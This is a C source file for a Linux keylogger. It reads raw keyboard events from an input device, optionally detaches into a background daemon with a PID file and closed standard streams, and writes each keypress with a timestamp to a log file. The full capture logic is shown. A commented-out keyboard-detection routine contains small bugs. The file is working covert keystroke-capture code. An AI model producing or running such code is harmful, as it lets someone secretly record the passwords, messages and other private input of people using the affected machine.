/*
  linux keyloggger
  @author Liu Mohan
*/
#include "keylogger.h"
#include <regex.h>
#include <time.h>
#include <sys/wait.h>

#define DEV_MAX 128
#define BUFFER_SIZE 4096

#define LSHIFT_VAL 42
#define RSHIFT_VAL 54
#define CAPS_VAL 58
#define ENTER_VAL 28

char* default_log_path = "./key.log";
char* pid_file = "/var/run/keyloggger.pid";
char* event_list = "/proc/bus/input/device";

FILE* log_fp;

int event_fd;


// registered to handle SIGINT: release resources and stop logging
void sigint_handler(int signal_num){
  close(event_fd);
  if(log_fp != NULL){
    fprintf(log_fp, "Stop Logging !\n");
    fclose(log_fp);
  }

  remove(pid_file);
  exit(EXIT_SUCCESS);
}

static inline void daemon_start(){
  pid_t pid;

  pid = fork();

  if(pid < 0){
    handle_error(stderr, 10);
  }
  if(pid > 0){
    int status;
    wait(&status);
    if(status != 0){
      handle_error(stderr, 10);
    }
    exit(EXIT_SUCCESS);
  }

  // now in second generation
  if(setsid() < 0){
    exit(EXIT_FAILURE);
  }

  pid = fork();

  if(pid < 0){
    exit(EXIT_FAILURE);
  }
  if(pid > 0){
    exit(EXIT_SUCCESS);
  }

  // now in the third genration
  umask(0);

  close(0);
  close(1);
  close(2);

  // save pid to /var/run
  pid = getpid();
  FILE * pid_fp = fopen(pid_file, "w");
  if(pid_fp == NULL){
    exit(EXIT_FAILURE);
  }
  fprintf(pid_fp, "%d", pid);
  fflush(pid_fp);
  fclose(pid_fp);

  signal(SIGINT, sigint_handler);
}

/*
XXX this function is not used in present version
*/

// int find_all_keyboards(device_info* keyboards, int* keyboard_cnt){
//   int _keyboard_cnt = 0;

//   int dev_cnt = -1;
//   device_info device_infos[DEV_MAX];
//   FILE* fp = fopen(event_list, "r");
//   char type;
//   char buffer[2048];
//   char attr[5];
//   char value[128];
//   char events[128];

//   INFO("fp=%p\n", fp);

//   while(1){
//     type = fgetc(fp);
//     if(type == EOF){
//       dev_cnt++;
//       break;
//     }
//     fscanf(fp, ": %[^\n]%*c", buffer);
//     switch(type){

//       case 'I':
//         dev_cnt++;
//         if(dev_cnt >= DEV_MAX) goto lable_break;
//         break;

//       case 'N':
//         sscanf(buffer, "Name=\"%[^\"]\"", device_infos[dev_cnt].name);
//         break;

//       case 'P':
//       case 'S':
//       case 'U':
//         break;

//       case 'H':
//         sscanf(buffer, "Handlers=%[^$]", events);
//         char event_id[16];
//         regex_t reg;
//         regmatch_t match;
//         regcomp(&reg, "event[0-9]+", REG_EXTENDED);
//         regexec(&reg, events, 1, &match, 0);
//         regfree(&reg);
//         strncpy(event_id, events+match.rm_so+5, match.rm_eo - match.rm_so - 5);
//         event_id[match.rm_eo-match.rm_so - 5] = 0;
//         device_infos[dev_cnt].event_id = atoi(event_id);
//         break;

//       case 'B':
//         sscanf(buffer, "%[^=]%*[=]%s", attr, value);
//         if(strcmp(attr, "EV") == 0){
//           device_infos[dev_cnt].ev = strtol(value, NULL, 16);
//         }
//         break;
//       default:break;
//     }
//   }
// lable_break:
  
//   // find keyboards
//   for(int i = 0; i < dev_cnt; i++) {
//     if(device_infos[i].ev && 0x100013 == 0x100013){ // is keyboard
//       strcpy(keyboards[_keyboard_cnt].name, device_infos[i].name);
//       keyboards[_keyboard_cnt].ev = device_infos[i].ev;
//       keyboards[_keyboard_cnt].event_id = device_infos[i].event_id;
//       _keyboard_cnt++;
//     }
//   }
//   *keyboard_cnt = _keyboard_cnt;
//   return 0;
// }

void logger(){
  int shift_pressed = 0;
  int caps_pressed = 0;
  time_t time_stamp;
  char readable_time;
  fprintf(log_fp, "Start logging\n");
  fflush(log_fp);
  while(1){
    struct input_event ev;
    read(event_fd, &ev, sizeof(ev));
    if(ev.type != EV_KEY){
      continue;
    }

    char** table_ptr;

    if(ev.value == 1){
      if(ev.code == LSHIFT_VAL || ev.code == RSHIFT_VAL){
        shift_pressed++;
      }
      if(shift_pressed && caps_pressed){
        table_ptr = shift_caps_scancode_to_ascii;
      }
      else if(shift_pressed && !caps_pressed){
        table_ptr = shift_scancode_to_ascii;
      }
      else if(!shift_pressed && caps_pressed){
        table_ptr = caps_scancode_to_ascii;
      }
      else{
        table_ptr = normal_scancode_to_ascii;
      }

      // time stamp:
      #define TIMESTAMP_SIZE 32
      char time_stamp[TIMESTAMP_SIZE];
      struct tm * local_time = localtime(&(ev.time.tv_sec));
      strftime(time_stamp, TIMESTAMP_SIZE, "%Y-%m-%d %H:%M:%S", local_time);
      
      fprintf(log_fp, "%s.%06ld>%s\n",time_stamp, ev.time.tv_usec, table_ptr[ev.code]);
      fflush(log_fp);
    }
    else if(ev.value == 0){
      if(ev.code == CAPS_VAL){
        caps_pressed = 1 - caps_pressed;// 0-->1 or 1-->0
      }
      if(ev.code == LSHIFT_VAL || ev.code == RSHIFT_VAL){
        shift_pressed = shift_pressed - 1 > 0 ? shift_pressed - 1 : 0;
      }
    }
  }
}

void start_logging(arguments args){
  // apply for resources
  char * log_path;
  device_info keyboards[64];
  int keyboard_cnt;
  if(args.arg_log == NULL){
    log_path = default_log_path;
  }
  else{
    log_path = args.arg_log;
  }
  log_fp = fopen(log_path, "w");
  if(log_fp == NULL){
    handle_error(stderr, 7);
  }

  event_fd = open(args.arg_dev, O_RDONLY);
  if(event_fd == -1){
    handle_error(stderr, 8);
  }

  // logger code here:
  if(args.arg_daemon_flag == 0){
    daemon_start();
  }
  else{
    signal(SIGINT, sigint_handler);
  }

  logger();

}